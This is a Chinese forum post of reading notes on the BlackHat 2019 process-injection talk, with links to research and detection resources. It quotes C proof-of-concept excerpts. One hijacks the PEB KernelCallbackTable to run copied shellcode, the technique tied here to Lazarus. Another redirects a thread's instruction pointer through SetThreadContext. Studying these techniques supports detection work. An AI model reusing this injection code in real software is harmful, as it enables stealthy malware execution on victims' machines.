> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-271451.htm)

> [原创]《Process Injection Techniques - Gotta Catch Them All》议题读后记

0x01 《Process Injection Techniques - Gotta Catch Them All》
----------------------------------------------------------

BlackHat 2019 议题，相关链接如下：

 

• [Presentation Slides](http://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf)  
• [White Paper](http://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf)  
• [Tool](https://github.com/SafeBreach-Labs/pinjectra)

 

作者于文中讨论的是 True Process Injection：

 

![](https://s4.ax1x.com/2022/02/10/HYOBQS.png)

 

Injection 可划分为两项子技术：

 

![](https://s4.ax1x.com/2022/02/10/HYOdRf.png)

 

所以作者在 Paper 中将所有提到的技术划分为两类——write primitive 与 execution method，每一项 Injection 后面会标注其属于哪一类：

 

![](https://s4.ax1x.com/2022/02/10/HYOaJP.png)

 

作者在列出每一项 Injection 后分析其核心原理，给出 POC，并给出评估：

 

![](https://s4.ax1x.com/2022/02/10/HYOwz8.png)

 

最后列出表格总结前文提到的所有技术。作者在最后还提到一个有意思的 Auxiliary Technique：

 

![](https://s4.ax1x.com/2022/02/10/HYOUit.png)

 

Paper 中第 16 项 KernelControlTable execution method (FinFisher/FinSpy 2018)，Lazarus 在最近的攻击活动中利用了该技术——[North Korea’s Lazarus APT leverages Windows Update client, GitHub in latest campaign](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)，笔者在 [Lazarus KernelCallbackTable Hooking](https://bbs.pediy.com/thread-271435.htm) 一文中对其进行了简要分析，[ORCA666](https://twitter.com/ORCA6665) 近日发布了 [POC](https://gitlab.com/ORCA666/kcthijack)：

```
PssSuccess = PssCaptureSnapshot(
    TargetProcess,
    PSS_QUERY_PROCESS_INFORMATION,
    NULL,
    &SnapshotHandle);
if (PssSuccess != ERROR_SUCCESS) {
    printf("[!] PssCaptureSnapshot failed: Win32 error %d \n", GetLastError());
    return FALSE;
}
PssSuccess = PssQuerySnapshot(
    SnapshotHandle,
    PSS_QUERY_PROCESS_INFORMATION,
    &PI,
    sizeof(PSS_PROCESS_INFORMATION)
);
if (PssSuccess != ERROR_SUCCESS) {
    printf("[!] PssQuerySnapshot failed: Win32 error %d \n", GetLastError());
    return FALSE;
}
if (PI.PebBaseAddress == NULL) {
    printf("[!] PI.PebBaseAddress IS NULL \n");
    return FALSE;
}
else {
    //ReadProcessMemory(TargetProcess, PI.PebBaseAddress, &peb, sizeof(peb), &lpNumberOfBytesRead);
    RtlMoveMemory(&peb, PI.PebBaseAddress, sizeof(PEB));
    if (peb.KernelCallbackTable == 0){
        printf("[!] KernelCallbackTable is NULL : Win32 error %d \n", GetLastError());
        return FALSE;
    }
    else {
        memcpy(&kct, peb.KernelCallbackTable, sizeof(kct));
        printf("[i] [BEFORE]kct.__fnDWORD : %0-16p \n", (void*) kct.__fnDWORD);
        if (Clean ==  TRUE){
            //ReadProcessMemory(TargetProcess, WMIsAO_ADD, &Buffer, Size, &lpNumberOfBytesRead);
            RtlMoveMemory(&Buffer, WMIsAO_ADD, Size);
            if (Buffer == NULL) {
                printf("[!] Buffer is NULL: Win32 error %d \n", GetLastError());
                return FALSE;
            }
        }
        Success = VirtualProtect(WMIsAO_ADD, Size, PAGE_READWRITE, &Old);
        if (Success != TRUE) {
            printf("[!] [1] VirtualProtect failed: Win32 error %d \n", GetLastError());
            return FALSE;
        }
 
        memcpy(WMIsAO_ADD, rawData, Size);
 
        Success = VirtualProtect(WMIsAO_ADD, Size, PAGE_EXECUTE_READWRITE, &Old);
        if (Success != TRUE) {
            printf("[!] [2] VirtualProtect failed: Win32 error %d \n", GetLastError());
            return FALSE;
        }
        printf("[i] WMIsAO_ADD : %0-16p \n", (void*)WMIsAO_ADD);
 
 
        memcpy(&Newkct, &kct, sizeof(KERNELCALLBACKTABLE));
        Newkct.__fnDWORD = (ULONG_PTR)WMIsAO_ADD;
 
        pNewkct = VirtualAlloc(NULL, sizeof(KERNELCALLBACKTABLE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        memcpy(pNewkct, &Newkct, sizeof(KERNELCALLBACKTABLE));
 
 
        Success = VirtualProtect(PI.PebBaseAddress, sizeof(PEB), PAGE_READWRITE, &Old);
        //WriteProcessMemory(TargetProcess, (PBYTE)PI.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &pNewkct, sizeof(ULONG_PTR), &lpNumberOfBytesWritten);
        RtlMoveMemory((PBYTE)PI.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &pNewkct, sizeof(ULONG_PTR));
        Success = VirtualProtect(PI.PebBaseAddress, sizeof(PEB), Old, &Old);
        //if (lpNumberOfBytesWritten == 0) {
        //    printf("[!] WriteProcessMemory failed: Win32 error %d \n", GetLastError());
        //    return FALSE;
        //}
        //else {
            Check_fnDWORDAfterOverWriting(TargetProcess);
            MessageBoxA(NULL, "test", "test", MB_OK); //this will trigger the shellcode, and u wont see the messagebox ;0
            if (Clean == TRUE) {
                //WriteProcessMemory(TargetProcess, WMIsAO_ADD, &Buffer, sizeof(Buffer), &lpNumberOfBytesWritten);
                RtlMoveMemory(WMIsAO_ADD, Buffer, sizeof(Buffer));
                ZeroMemory(Buffer, sizeof(Buffer));
            }
        //}
        return TRUE;
    }
}

```

[ORCA666](https://twitter.com/ORCA6665) 发布的另一个项目 [snaploader](https://gitlab.com/ORCA666/snaploader/)：

 

![](https://s4.ax1x.com/2022/02/10/HYODsg.png)

```
while (PssSuccess == ERROR_SUCCESS) {
        ++i;
        PssSuccess = PssWalkSnapshot(
            SnapshotHandle,
            PSS_WALK_THREADS,
            WalkMarkerHandle,
            &Handle,
            sizeof(PSS_THREAD_ENTRY)
        );
        if (ThreadEntry.ThreadId == TID){
            memcpy(&Snapctx, ThreadEntry.ContextRecord, sizeof(CONTEXT));
            printf("[+] Snapctx.Rip Before Setting : 0x%-016p\n", (void*)Snapctx.Rip);
            if (Rip) {
                Snapctx.Rip = *(DWORD64*)Rip;
            }
            if (Rsp) {
                Snapctx.Rsp = *(DWORD64*)Rsp;
            }
            printf("[+] Snapctx.Rip After Setting : 0x%-016p\n", (void*)Snapctx.Rip);
 
            if (!SetThreadContext(hThread, &Snapctx)) {
                printf("[!] SetThreadContext FAILED with Error : %d \n", GetLastError());
                return FALSE;
            }
            Sleep(5000);
            printf("[+] DebugActiveProcessStop ...");
            DebugActiveProcessStop(PID);
            printf("[+] DONE \n");
        }
}

```

0x02 PE Injection
-----------------

*   [hasherezade](https://gist.github.com/hasherezade)/**[injection_demos.md](https://gist.github.com/hasherezade/e6daa4124fab73543497b6d1295ece10)**
*   [RedTeamOperations](https://github.com/RedTeamOperations)/**[Advanced-Process-Injection-Workshop](https://github.com/RedTeamOperations/Advanced-Process-Injection-Workshop)**
*   [Ten process injection techniques: A technical survey of common and trending process injection techniques](https://www.elastic.co/cn/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
*   [jxy-s](https://github.com/jxy-s)/**[herpaderping](https://github.com/jxy-s/herpaderping)**，[DivingDeeper.md](https://github.com/jxy-s/herpaderping/blob/main/res/DivingDeeper.md)

0x03 Detections
---------------

*   [Hunting In Memory](https://www.elastic.co/cn/blog/hunting-memory)
*   [Engineering Process Injection Detections - Part 1: Research](https://posts.specterops.io/engineering-process-injection-detections-part-1-research-951e96ad3c85)
*   [Engineering Process Injection Detections — Part 2: Data Modeling](https://posts.specterops.io/engineering-process-injection-detections-part-2-data-modeling-c11f5aedf5e0)

0x04 References
---------------

1.  [Windows Process Injection: Extra Window Bytes](https://modexp.wordpress.com/2018/08/26/process-injection-ctray/)
2.  [Windows Process Injection: PROPagate](https://modexp.wordpress.com/2018/08/23/process-injection-propagate/)
3.  [Windows Process Injection: Sharing the payload](https://modexp.wordpress.com/2018/07/15/process-injection-sharing-payload/)
4.  [Advanced Evasion Techniques by Win32/Gapz](https://www.welivesecurity.com/wp-content/uploads/2013/05/CARO_2013.pdf)
5.  [Injection on Steroids: Codeless code injection and 0-day techniques](https://www.slideshare.net/enSilo/injection-on-steroids-codeless-code-injection-and-0day-techniques)
6.  [AtomBombing – A Brand New Code Injection Technique for Windows](https://www.fortinet.com/blog/threat-research/atombombing-brand-new-code-injection-technique-for-windows)
7.  Diving Into Zberp’s Unconventional Process Injection Technique
8.  [【恶意代码分析技巧】14 - 修改内存指针实现进程注入](https://www.sec-in.com/article/64)
9.  [一种清除 windows 通知区域 “僵尸” 图标的方案——问题分析](https://blog.csdn.net/breaksoftware/article/details/17130049)
10.  [Executing Shellcode via Callbacks](https://osandamalith.com/2021/04/01/executing-shellcode-via-callbacks/)
11.  [Code Injection - Weaponize GhostWriting Injection](http://blog.sevagas.com/IMG/pdf/code_injection_series_part5.pdf)

 

本文可以当作是一篇汇总，记录了笔者在阅读 BlackHat 2019《Process Injection Techniques - Gotta Catch Them All》议题时所搜集到的相关资料，**0x04 References** 部分 1-7 都在 White Paper 中有提到，笔者认为原文会比 Paper 更详尽一些。另，[modexp](https://modexp.wordpress.com/) 与 [Hexacorn](https://www.hexacorn.com/blog/) 上有很多关于 Process Injection 这方面的博客。

[【公告】欢迎大家踊跃尝试高研班 11 月试题，挑战自己的极限！](https://bbs.pediy.com/thread-270220.htm)

最后于 1 小时前 被 erfze 编辑 ，原因：

[#系统底层](forum-4-1-2.htm) [#病毒木马](forum-4-1-6.htm)